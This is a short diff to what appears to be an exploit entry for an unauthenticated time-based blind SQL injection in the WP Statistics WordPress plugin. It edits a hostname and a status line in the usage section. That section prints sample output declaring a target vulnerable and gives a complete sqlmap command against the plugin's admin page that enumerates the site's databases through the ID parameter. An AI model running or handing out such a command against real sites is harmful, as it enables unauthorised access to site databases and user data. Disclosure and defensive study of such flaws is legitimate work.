@@ -3,8 +3,8 @@ WordPress Plugin WP Statistics 13.0.7 - Time-Based Blind SQL Injection (Unauthen
 # Usage:
 ```
 (+) WP-statistical Plugin Version = 13.0.6
-(+) wp.site.com Target is vuln!
-(+) Try payload
+(+) wp-site.com Target is vuln!
+(*) Try payload
 (+) WwoowowoW maybe vuln ;)
 Try: sqlmap -u "https://wp-site.com/wp-admin/admin.php?ID=1&page=wps_pages_page&type=1" --technique=T --dbms="mysql" -p "ID" -b --level=5 --time-sec=10 --dbs
 ```
